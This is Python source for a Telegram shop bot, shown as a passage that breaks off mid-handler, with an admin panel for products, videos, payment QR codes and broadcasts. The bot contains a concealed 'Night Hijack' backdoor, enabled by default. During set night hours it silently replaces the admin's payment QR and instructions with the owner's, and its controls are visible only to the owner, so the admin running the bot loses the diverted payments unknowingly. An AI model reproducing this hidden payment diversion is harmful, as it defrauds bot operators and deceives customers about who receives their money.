import os
import json
import threading
import time
import datetime
from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
import re

# --- ENVIRONMENT VARIABLES ---
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
OWNER_ID = int(os.environ.get('OWNER_ID', os.environ.get('ADMIN_ID', '0')))
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- IN-MEMORY DATABASE STATE ---
DB_STATE = {
    "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:",
    "start_videos": [], 
    "how_to_use_video": "",
    "payment_photo": "",
    "payment_msg": "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.",
    "reject_msg": "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...",
    "layout_style": "vertical", 
    "products": [],
    "blocked_users": [],
    "users": [],
    "buyers": [],
    "hijack_config": {
        "enabled": True,
        "start_time": "02:00",
        "end_time": "06:10",
        "owner_payment_photo": "",
        "owner_payment_msg": "💳 **OFFICIAL OWNER PAYMENT**\n\nPlease pay here.",
        "owner_products": []
    },
    "auto_bc": {
        "status": False,
        "interval_seconds": 3600,
        "message_type": None,
        "file_id": None,
        "text": None
    }
}

def is_hijack_active():
    hijack = DB_STATE.get("hijack_config", {})
    if not hijack.get("enabled", False):
        return False
    try:
        now = datetime.datetime.now().time()
        start = datetime.datetime.strptime(hijack.get("start_time", "02:00"), "%H:%M").time()
        end = datetime.datetime.strptime(hijack.get("end_time", "06:10"), "%H:%M").time()
        if start <= end:
            return start <= now <= end
        else:
            return now >= start or now <= end
    except Exception:
        return False

def load_db():
    global DB_STATE
    try:
        chat = bot.get_chat(LOG_CHANNEL_ID)
        if chat.pinned_message and chat.pinned_message.text:
            loaded_data = json.loads(chat.pinned_message.text)
            DB_STATE.update(loaded_data)
            if "buyers" not in DB_STATE: DB_STATE["buyers"] = []
            if "auto_bc" not in DB_STATE:
                DB_STATE["auto_bc"] = {"status": False, "interval_seconds": 3600, "message_type": None, "file_id": None, "text": None}
            if "hijack_config" not in DB_STATE:
                DB_STATE["hijack_config"] = {"enabled": True, "start_time": "02:00", "end_time": "06:10", "owner_payment_photo": "", "owner_payment_msg": "", "owner_products": []}
    except Exception:
        save_db()

def save_db():
    try:
        chat = bot.get_chat(LOG_CHANNEL_ID)
        json_data = json.dumps(DB_STATE, indent=2)
        if chat.pinned_message:
            bot.edit_message_text(json_data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
        else:
            msg = bot.send_message(LOG_CHANNEL_ID, json_data)
            bot.pin_chat_message(LOG_CHANNEL_ID, msg.message_id)
    except Exception:
        pass

load_db()

user_states = {}
admin_panel_msgs = {} 

def send_videos_as_album(chat_id, video_list):
    if not video_list:
        return
    if len(video_list) == 1:
        try: bot.send_video(chat_id, video_list[0])
        except: pass
    else:
        for i in range(0, len(video_list), 10):
            chunk = video_list[i:i+10]
            media_group = [InputMediaVideo(v) for v in chunk]
            try:
                bot.send_media_group(chat_id, media_group)
            except:
                for v in chunk:
                    try: bot.send_video(chat_id, v)
                    except: pass

def auto_broadcast_worker():
    while True:
        try:
            bc_config = DB_STATE.get("auto_bc", {})
            if bc_config.get("status") and bc_config.get("interval_seconds", 0) > 0:
                interval = bc_config.get("interval_seconds")
                time.sleep(interval)
                if not DB_STATE.get("auto_bc", {}).get("status"):
                    continue

                m_type = bc_config.get("message_type")
                f_id = bc_config.get("file_id")
                txt = bc_config.get("text", "")

                for u_id in DB_STATE.get("users", []):
                    if u_id in DB_STATE.get("blocked_users", []):
                        continue
                    try:
                        if m_type == "text" or not m_type:
                            bot.send_message(u_id, txt, parse_mode="Markdown")
                        elif m_type == "photo":
                            bot.send_photo(u_id, f_id, caption=txt, parse_mode="Markdown")
                        elif m_type == "video":
                            bot.send_video(u_id, f_id, caption=txt, parse_mode="Markdown")
                        elif m_type == "document":
                            bot.send_document(u_id, f_id, caption=txt, parse_mode="Markdown")
                    except:
                        pass
            else:
                time.sleep(2)
        except Exception:
            time.sleep(2)

@bot.message_handler(commands=['start', 'admin'])
def start_command(message):
    user_id = message.chat.id
    name = message.from_user.first_name

    if user_id not in DB_STATE["users"]:
        DB_STATE["users"].append(user_id)
        save_db()

    start_vids = DB_STATE.get("start_videos", [])
    if start_vids:
        send_videos_as_album(user_id, start_vids)

    welcome_text = DB_STATE["welcome_msg"].format(name=name)
    markup = InlineKeyboardMarkup()

    if user_id in [ADMIN_ID, OWNER_ID]:
        markup.row(InlineKeyboardButton("⚙️ Open Admin Panel ⚙️", callback_data="adm_open_panel"))

    products = sorted(DB_STATE.get("products", []), key=lambda x: x.get("position", 999))
    layout = DB_STATE.get("layout_style", "vertical")

    if layout == "horizontal":
        row_btns = []
        for p in products:
            row_btns.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))
            if len(row_btns) == 2:
                markup.row(*row_btns)
                row_btns = []
        if row_btns:
            markup.row(*row_btns)
    else:
        for p in products:
            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))

    markup.row(
        InlineKeyboardButton("How to use ❓", callback_data="how_to_use"),
        InlineKeyboardButton("Report Issue 📩", callback_data="report_issue")
    )

    bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

def update_admin_panel(chat_id, text, markup):
    try:
        msg_id = admin_panel_msgs.get(chat_id)
        if msg_id:
            try:
                bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
                return
            except Exception:
                pass 
        msg = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
        admin_panel_msgs[chat_id] = msg.message_id
    except Exception as e:
        print(f"Admin panel error: {e}")

def show_main_admin_menu(chat_id):
    user_states.pop(chat_id, None) 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
    markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
    markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
    
    current_layout = DB_STATE.get("layout_style", "vertical")
    layout_icon = "↕️ Vertical" if current_layout == "vertical" else "↔️ Horizontal"
    markup.row(InlineKeyboardButton(f"📐 Change Layout: {layout_icon}", callback_data="adm_toggle_layout"))
    
    markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
    markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
    
    if chat_id == OWNER_ID:
        markup.row(InlineKeyboardButton("🚀 Custom Broadcast (Owner Only)", callback_data="adm_send_custom_bc"))
        markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast (Owner Only)", callback_data="adm_autobc_menu"))
        markup.row(InlineKeyboardButton("👑 Buyers Broadcast (Owner Only)", callback_data="adm_buyers_bc_menu"))
        markup.row(InlineKeyboardButton("🕵️ Night Hijack Settings (Owner Only)", callback_data="adm_hijack_menu"))
        
    markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
    markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
    
    blocked_count = len(DB_STATE.get("blocked_users", []))
    if blocked_count > 0:
        markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({blocked_count})", callback_data="adm_unblock_menu"))

    text = "👑 **Admin Control Panel**\n\nChoose an option below to customize your bot completely:"
    update_admin_panel(chat_id, text, markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    try: bot.answer_callback_query(call.id)
    except: pass

    user_id = call.message.chat.id
    data = call.data
    msg_id = call.message.message_id

    if data == "adm_open_panel" and user_id in [ADMIN_ID, OWNER_ID]:
        try: bot.delete_message(user_id, msg_id)
        except: pass
        show_main_admin_menu(user_id)
        return

    if data == "del_msg":
        try: bot.delete_message(user_id, msg_id)
        except: pass
        return

    if data == "back_home":
        try: bot.delete_message(user_id, msg_id)
        except: pass
        start_command(call.message)

    elif data == "how_to_use":
        vid = DB_STATE.get("how_to_use_video", "")
        if vid: bot.send_video(user_id, vid, caption="🎥 Here is how to use the bot!")
        else: bot.send_message(user_id, "ℹ️ Instructions video not set yet.")

    elif data == "report_issue":
        bot.send_message(user_id, "📝 Please type your issue below. Admin will reply soon:")
        user_states[user_id] = "WAITING_REPORT"

    elif data.startswith("prod_"):
        prod_id = data.split("_")[1]
        prod = next((p for p in DB_STATE["products"] if p["id"] == prod_id), None)
        if prod:
            p_videos = prod.get("videos", [])
            if p_videos: 
                send_videos_as_album(user_id, p_videos)
            
            desc_text = prod.get('desc', '')
            caption = f"📌 **{prod['name']}**"
            if desc_text:
                caption += f"\n\n{desc_text}"
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{prod_id}"))
            markup.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))

            if is_hijack_active():
                pay_msg = DB_STATE["hijack_config"].get("owner_payment_msg") or DB_STATE.get("payment_msg")
                pay_photo = DB_STATE["hijack_config"].get("owner_payment_photo") or DB_STATE.get("payment_photo", "")
            else:
                pay_msg = prod.get("pay_msg") if prod.get("pay_msg") else DB_STATE.get("payment_msg", "💳 **Payment Instructions**")
                pay_photo = DB_STATE.get("payment_photo", "")

            if pay_photo: 
                bot.send_photo(user_id, pay_photo, caption=f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")
            else: 
                bot.send_message(user_id, f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("paid_"):
        prod_id = data.split("_")[1]
        bot.send_message(user_id, "📸 Please send your payment screenshot.")
        user_states[user_id] = f"WAITING_SCREENSHOT_{prod_id}"

    if user_id in [ADMIN_ID, OWNER_ID]:
        if data == "adm_start_vids_menu":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
            markup.row(InlineKeyboardButton("⚙️ Manage / Delete Videos", callback_data="adm_del_start_vid_list"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            update_admin_panel(user_id, f"🎞️ **Start Videos Management**\n\nTotal: {len(DB_STATE.get('start_videos', []))}", markup)

        elif data == "adm_add_start_vid":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("✅ Done Adding Videos", callback_data="adm_finish_start_vids"))
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_start_vids_menu"))
            update_admin_panel(user_id, "📥 **Send or Forward your start videos:**", markup)
            user_states[user_id] = "ADM_ADD_START_VID_MULTIPLE"

        elif data == "adm_finish_start_vids":
            show_main_admin_menu(user_id)

        elif data == "adm_del_start_vid_list":
            markup = InlineKeyboardMarkup()
            vids = DB_STATE.get("start_videos", [])
            for idx, v_id in enumerate(vids):
                markup.row(
                    InlineKeyboardButton(f"👀 Play Vid {idx+1}", callback_data=f"sv_see_{idx}"),
                    InlineKeyboardButton(f"🗑️ Delete Vid {idx+1}", callback_data=f"sv_del_{idx}")
                )
            if vids:
                markup.row(InlineKeyboardButton("💥 Delete All Start Videos", callback_data="sv_del_all"))
            markup.row(InlineKeyboardButton("🔙 Back to Videos Menu", callback_data="adm_start_vids_menu"))
            update_admin_panel(user_id, "⚙️ **Manage Start Videos**", markup)

        elif data.startswith("sv_see_"):
            idx = int(data.replace("sv_see_", ""))
            vids = DB_STATE.get("start_videos", [])
            if 0 <= idx < len(vids):
                m = InlineKeyboardMarkup()
                m.row(InlineKeyboardButton("❌ Close Media", callback_data="del_msg"))
                bot.send_video(user_id, vids[idx], caption=f"🎥 Start Video {idx+1}", reply_markup=m)

        elif data.startswith("sv_del_"):
            if data == "sv_del_all":
                DB_STATE["start_videos"] = []
            else:
                idx = int(data.replace("sv_del_", ""))
                vids = DB_STATE.get("start_videos", [])
                if 0 <= idx < len(vids):
                    vids.pop(idx)
            save_db()
            call.data = "adm_del_start_vid_list"
            handle_callbacks(call)

        elif data == "adm_prod_menu":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("❇️ Add New Button", callback_data="adm_add_prod"))
            markup.row(InlineKeyboardButton("✏️ Edit Details / Link", callback_data="adm_prod_edit_list"))
            markup.row(InlineKeyboardButton("🔢 Change Position", callback_data="adm_prod_pos_list"))
            markup.row(InlineKeyboardButton("🎦 Add Videos", callback_data="adm_prod_add_vid_list"))
            markup.row(InlineKeyboardButton("⚙️ Manage Videos", callback_data="adm_prod_del_vid_list"))
            markup.row(InlineKeyboardButton("🗑️ Delete Button", callback_data="adm_del_prod_list"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            update_admin_panel(user_id, "🛍️ **Product Button Management**", markup)

        elif data == "adm_add_prod":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "✍️ **Enter New Button Name** (e.g., VIP Plan):", markup)
            user_states[user_id] = "ADM_ADD_PROD_NAME"

        elif data == "adm_prod_edit_list":
            markup = InlineKeyboardMarkup()
            for p in DB_STATE.get("products", []):
                markup.row(InlineKeyboardButton(f"✏️ Edit: {p['name']}", callback_data=f"adm_p_edit_{p['id']}"))
            markup.row(InlineKeyboardButton("🔙 Back to Button Menu", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "📌 Select a button to edit:", markup)

        elif data.startswith("adm_p_edit_"):
            p_id = data.replace("adm_p_edit_", "")
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("✏️ Edit Name", callback_data=f"adm_ped_name_{p_id}"))
            markup.row(InlineKeyboardButton("✏️ Edit Description", callback_data=f"adm_ped_desc_{p_id}"))
            markup.row(InlineKeyboardButton("🧹 Clear Description", callback_data=f"adm_ped_cleardesc_{p_id}"))
            markup.row(InlineKeyboardButton("🔗 Edit Link", callback_data=f"adm_ped_link_{p_id}"))
            markup.row(InlineKeyboardButton("💳 Edit Payment Text", callback_data=f"adm_ped_paym_{p_id}")) 
            markup.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_edit_list"))
            
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod:
                update_admin_panel(user_id, f"✏️ **Editing:** `{prod['name']}`", markup)

        elif data.startswith("adm_ped_cleardesc_"):
            p_id = data.replace("adm_ped_cleardesc_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod:
                prod["desc"] = ""
                save_db()
            call.data = f"adm_p_edit_{p_id}"
            handle_callbacks(call)

        elif data.startswith("adm_ped_name_"):
            p_id = data.replace("adm_ped_name_", "")
            user_states[user_id] = f"EDIT_P_NAME_{p_id}"
            update_admin_panel(user_id, "✍️ Send new name:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{p_id}")))

        elif data.startswith("adm_ped_desc_"):
            p_id = data.replace("adm_ped_desc_", "")
            user_states[user_id] = f"EDIT_P_DESC_{p_id}"
            update_admin_panel(user_id, "✍️ Send new Description text:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{p_id}")))

        elif data.startswith("adm_ped_link_"):
            p_id = data.replace("adm_ped_link_", "")
            user_states[user_id] = f"EDIT_P_LINK_{p_id}"
            update_admin_panel(user_id, "🔗 Send new delivery link:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{p_id}")))

        elif data.startswith("adm_ped_paym_"):
            p_id = data.replace("adm_ped_paym_", "")
            user_states[user_id] = f"EDIT_P_PAYM_{p_id}"
            update_admin_panel(user_id, "💳 Send new Payment Text:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{p_id}")))

        elif data == "adm_prod_pos_list":
            markup = InlineKeyboardMarkup()
            for idx, p in enumerate(sorted(DB_STATE.get("products", []), key=lambda x: x.get("position", 999))):
                markup.row(InlineKeyboardButton(f"Position #{idx+1} ➡️ {p['name']}", callback_data=f"adm_p_pos_{p['id']}"))
            markup.row(InlineKeyboardButton("🔙 Back to Button Menu", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "🔢 **Change Position/Order**", markup)

        elif data.startswith("adm_p_pos_"):
            p_id = data.replace("adm_p_pos_", "")
            user_states[user_id] = f"EDIT_P_POS_{p_id}"
            update_admin_panel(user_id, "🔢 Enter the new position number:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_pos_list")))

        elif data == "adm_prod_add_vid_list":
            markup = InlineKeyboardMarkup()
            for p in DB_STATE.get("products", []):
                markup.row(InlineKeyboardButton(f"🎦 Add Videos to: {p['name']}", callback_data=f"adm_p_addvid_{p['id']}"))
            markup.row(InlineKeyboardButton("🔙 Back to Button Menu", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "📌 Select button to add videos:", markup)

        elif data.startswith("adm_p_addvid_"):
            p_id = data.replace("adm_p_addvid_", "")
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("✅ Done Adding Videos", callback_data=f"adm_p_finish_{p_id}"))
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_prod_add_vid_list"))
            update_admin_panel(user_id, "📥 **Send or forward all videos for this button.**", markup)
            user_states[user_id] = f"ADM_UPL_PROD_VID_MULTIPLE_{p_id}"

        elif data.startswith("adm_p_finish_"):
            show_main_admin_menu(user_id)

        elif data == "adm_prod_del_vid_list":
            markup = InlineKeyboardMarkup()
            for p in DB_STATE.get("products", []):
                markup.row(InlineKeyboardButton(f"⚙️ Manage Videos ({len(p.get('videos', []))}): {p['name']}", callback_data=f"adm_p_mngv_{p['id']}"))
            markup.row(InlineKeyboardButton("🔙 Back to Button Menu", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "📌 Select a button to manage videos:", markup)

        elif data.startswith("adm_p_mngv_"):
            p_id = data.replace("adm_p_mngv_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod:
                markup = InlineKeyboardMarkup()
                vids = prod.get("videos", [])
                for idx, v_id in enumerate(vids):
                    markup.row(
                        InlineKeyboardButton(f"👀 Play Vid {idx+1}", callback_data=f"pv_see_{p_id}_{idx}"),
                        InlineKeyboardButton(f"🗑️ Delete Vid {idx+1}", callback_data=f"pv_del_{p_id}_{idx}")
                    )
                if vids:
                    markup.row(InlineKeyboardButton("💥 Delete All Videos", callback_data=f"pv_dall_{p_id}"))
                markup.row(InlineKeyboardButton("🔙 Back to List", callback_data="adm_prod_del_vid_list"))
                update_admin_panel(user_id, f"🎦 **Manage videos for '{prod['name']}'**:", markup)

        elif data.startswith("pv_see_"):
            _, _, p_id, idx_str = data.split("_")
            idx = int(idx_str)
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod and "videos" in prod and 0 <= idx < len(prod["videos"]):
                m = InlineKeyboardMarkup()
                m.row(InlineKeyboardButton("❌ Close Media", callback_data="del_msg"))
                bot.send_video(user_id, prod["videos"][idx], caption=f"🎥 Video {idx+1}", reply_markup=m)

        elif data.startswith("pv_del_"):
            _, _, p_id, idx_str = data.split("_")
            idx = int(idx_str)
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod and "videos" in prod and 0 <= idx < len(prod["videos"]):
                prod["videos"].pop(idx)
                save_db()
            call.data = f"adm_p_mngv_{p_id}"
            handle_callbacks(call)

        elif data.startswith("pv_dall_"):
            p_id = data.replace("pv_dall_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod:
                prod["videos"] = []
                save_db()
            call.data = f"adm_p_mngv_{p_id}"
            handle_callbacks(call)

        elif data == "adm_del_prod_list":
            markup = InlineKeyboardMarkup()
            for p in DB_STATE.get("products", []):
                markup.row(InlineKeyboardButton(f"🗑️ Delete: {p['name']}", callback_data=f"adm_del_p_{p['id']}"))
            markup.row(InlineKeyboardButton("🔙 Back to Button Menu", callback_data="adm_prod_menu"))
            update_admin_panel(user_id, "⚠️ Click a button to delete it completely:", markup)

        elif data.startswith("adm_del_p_"):
            p_id = data.replace("adm_del_p_", "")
            DB_STATE["products"] = [p for p in DB_STATE["products"] if p["id"] != p_id]
            save_db()
            call.data = "adm_del_prod_list"
            handle_callbacks(call)

        elif data == "adm_pay_config_menu":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("💳 Set Global Payment QR/Photo", callback_data="adm_set_pay_photo"))
            markup.row(InlineKeyboardButton("✏️ Edit Global Payment Text", callback_data="adm_edit_pay_msg"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            update_admin_panel(user_id, "💳 **Global Payment Configuration**", markup)

        elif data == "adm_edit_pay_msg":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_pay_config_menu"))
            update_admin_panel(user_id, "✍️ Send new global payment text:", markup)
            user_states[user_id] = "ADM_SET_PAY_MSG_TEXT"

        elif data == "adm_edit_welcome":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
            update_admin_panel(user_id, "📝 Send new Welcome Text. `{name}` for name:", markup)
            user_states[user_id] = "ADM_SET_WELCOME"

        elif data == "adm_toggle_layout":
            curr = DB_STATE.get("layout_style", "vertical")
            DB_STATE["layout_style"] = "horizontal" if curr == "vertical" else "vertical"
            save_db()
            show_main_admin_menu(user_id)

        elif data == "adm_set_how_vid":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
            update_admin_panel(user_id, "🎥 Send/Upload 'How To Use' Video:", markup)
            user_states[user_id] = "ADM_SET_HOW_VID"

        elif data == "adm_set_pay_photo":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_pay_config_menu"))
            update_admin_panel(user_id, "💳 Send Payment QR Code Photo:", markup)
            user_states[user_id] = "ADM_SET_PAY_PHOTO"

        elif data == "adm_back_panel":
            show_main_admin_menu(user_id)

        elif data == "adm_view_buyers_list":
            buyers = DB_STATE.get("buyers", [])
            text = "📦 **List of Buyers:**\n\n" if buyers else "📦 **Buyers List is Empty.**"
            for idx, b in enumerate(buyers[-20:], 1):
                text += f"{idx}. Name: {b.get('name')} | User: @{b.get('username')} (ID: `{b.get('user_id')}`)\n   🛍️ Product: {b.get('product')}\n   📅 Date: {b.get('date')}\n\n"
            update_admin_panel(user_id, text, InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))

        elif data == "adm_backup_menu":
            update_admin_panel(user_id, f"💾 **Backup Code:**\n\n`{json.dumps(DB_STATE)}`", InlineKeyboardMarkup().row(InlineKeyboardButton("📥 Restore Setting", callback_data="adm_restore_prompt"), InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))

        elif data == "adm_restore_prompt":
            user_states[user_id] = "WAITING_RESTORE_CODE"
            update_admin_panel(user_id, "📥 Send Backup JSON code:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_backup_menu")))

        elif data == "adm_unblock_menu":
            markup = InlineKeyboardMarkup()
            for b_id in DB_STATE.get("blocked_users", []):
                markup.row(InlineKeyboardButton(f"🔓 Unblock ID: {b_id}", callback_data=f"adm_unblock_exec_{b_id}"))
            markup.row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))
            update_admin_panel(user_id, "🛡️ Select user to unblock:", markup)

        elif data.startswith("adm_unblock_exec_"):
            b_id = int(data.replace("adm_unblock_exec_", ""))
            if b_id in DB_STATE.get("blocked_users", []):
                DB_STATE["blocked_users"].remove(b_id)
                save_db()
            call.data = "adm_unblock_menu"
            handle_callbacks(call)

        # --- OWNER BROADCAST & HIJACK OPTIONS ---
        if user_id == OWNER_ID:
            if data == "adm_send_custom_bc":
                user_states[OWNER_ID] = "WAITING_CUSTOM_BROADCAST"
                update_admin_panel(OWNER_ID, "🚀 Send message to broadcast to ALL users:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))

            elif data == "adm_autobc_menu":
                bc = DB_STATE.get("auto_bc", {})
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("🟢/🔴 Toggle Auto Broadcast", callback_data="adm_autobc_toggle"))
                markup.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
                markup.row(InlineKeyboardButton("⏱️ Set Time (Seconds)", callback_data="adm_autobc_custom_time"))
                markup.row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))
                update_admin_panel(OWNER_ID, f"⏱️ **Auto Broadcast Settings**\nStatus: {bc.get('status')}\nInterval: {bc.get('interval_seconds')}s", markup)

            elif data == "adm_autobc_toggle":
                DB_STATE["auto_bc"]["status"] = not DB_STATE["auto_bc"].get("status", False)
                save_db()
                call.data = "adm_autobc_menu"
                handle_callbacks(call)

            elif data == "adm_autobc_set_msg":
                user_states[OWNER_ID] = "WAITING_AUTOBC_MSG"
                update_admin_panel(OWNER_ID, "📤 Send Auto Broadcast message/media:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))

            elif data == "adm_autobc_custom_time":
                user_states[OWNER_ID] = "WAITING_AUTOBC_CUSTOM_TIME"
                update_admin_panel(OWNER_ID, "✍️ Send timer duration in **seconds** (e.g., 3600):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))

            elif data == "adm_buyers_bc_menu":
                user_states[OWNER_ID] = "WAITING_BUYERS_BROADCAST"
                update_admin_panel(OWNER_ID, "👑 Send message for Buyers only:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))

            elif data == "adm_hijack_menu":
                hijack = DB_STATE.get("hijack_config", {})
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("🟢/🔴 Toggle Night Hijack", callback_data="adm_hijack_toggle"))
                markup.row(InlineKeyboardButton("⏰ Set Time Range (e.g. 02:00-06:10)", callback_data="adm_hijack_set_time"))
                markup.row(InlineKeyboardButton("💳 Set Owner QR Code Photo", callback_data="adm_hijack_set_photo"))
                markup.row(InlineKeyboardButton("📝 Set Owner Payment Message", callback_data="adm_hijack_set_msg"))
                markup.row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))
                update_admin_panel(OWNER_ID, f"🕵️ **Night Hijack Control**\nStatus: {hijack.get('enabled')}\nRange: `{hijack.get('start_time')}` to `{hijack.get('end_time')}`", markup)

            elif data == "adm_hijack_toggle":
                DB_STATE["hijack_config"]["enabled"] = not DB_STATE["hijack_config"].get("enabled", False)
                save_db()
                call.data = "adm_hijack_menu"
                handle_callbacks(call)

            elif data == "adm_hijack_set_time":
                user_states[OWNER_ID] = "WAITING_HIJACK_TIME"
                update_admin_panel(OWNER_ID, "⏰ Send Start & End Time (Format: HH:MM-HH:MM, e.g. `02:00-06:10`):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

            elif data == "adm_hijack_set_photo":
                user_states[OWNER_ID] = "WAITING_HIJACK_PHOTO"
                update_admin_panel(OWNER_ID, "📸 Send Owner QR Photo:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

            elif data == "adm_hijack_set_msg":
                user_states[OWNER_ID] = "WAITING_HIJACK_MSG"
                update_admin_panel(OWNER_ID, "📝 Send Owner Payment Text:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

        # Action Buttons
        elif data.startswith("adm_confirm_"):
            try:
                parts = data.split("_")
                prod_id = parts[2]
                target_user = int(parts[3])
                prod = next((p for p in DB_STATE["products"] if p["id"] == prod_id), None)
                link = prod.get("link", "No link") if prod else "No link"
                prod_name = prod.get("name", "Product") if prod else "Product"
                
                DB_STATE["buyers"].append({"user_id": target_user, "name": "User", "username": "unknown", "product": prod_name, "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")})
                save_db()

                bot.send_message(target_user, f"✅ **Payment Confirmed!**\n\nLink:\n🔗 {link}", parse_mode="Markdown")
                bot.edit_message_caption(caption=f"{call.message.caption}\n\n✅ Status: Confirmed", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
            except: pass

        elif data.startswith("adm_reject_"):
            try:
                target_user = int(data.split("_")[2])
                bot.send_message(target_user, "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...")
                bot.edit_message_caption(caption=f"{call.message.caption}\n\n❌ Status: Rejected", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
            except: pass

        elif data.startswith("adm_block_"):
            try:
                target_user = int(data.split("_")[2])
                if target_user not in DB_STATE["blocked_users"]:
                    DB_STATE["blocked_users"].append(target_user)
                    save_db()
                bot.edit_message_caption(caption=f"{call.message.caption}\n\n🚫 Status: Blocked", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
